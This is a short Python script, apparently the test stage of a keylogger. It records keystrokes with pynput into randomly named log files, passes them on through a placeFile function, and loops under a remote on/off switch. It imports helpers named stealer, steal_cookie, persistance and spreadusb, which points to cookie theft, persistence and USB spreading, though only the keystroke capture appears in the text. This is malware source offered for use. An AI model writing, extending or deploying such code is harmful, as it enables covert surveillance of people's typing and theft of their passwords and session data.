#from pynput import *
import pynput
from pynput.keyboard import Key, Listener
import logging
from converter import keylogger, stealer, persistance, spreadusb, delette, remove_cache, steal_cookie, placeFile
from random import randrange
import time
import os
print('''
############################################
#      TESTE KEYLOGGER PYTHON<-PHP         #
#             INITIALISATION               #
############################################
''')
def test():
    if keylogger() == "ON": 
        print(box)
        log_dir = "" # Ou se trouvera le fichier
        def on_press(key):
            logging.basicConfig(filename=(log_dir + "keytest_" + str(box) +".txt"), level=logging.DEBUG, format='%(message)s')
            print('{0}'.format(key))  
            logging.info(key)
            return False
                #return True
            #logging.disable(key)
        # Collect events until released
        with Listener(on_press=on_press) as listener:
            listener.join()
        test = os.path.getsize("keytest_" + str(box) + ".txt")
        print(test)
        if test < 601:
            try:
                placeFile(box)
            except:
                print("NON")
    elif keylogger() == "OFF":
        print("keylogg off")
        time.sleep(30)
    else:
        print("problème")       
box = randrange(5000000)
while True:
    test()

print("test")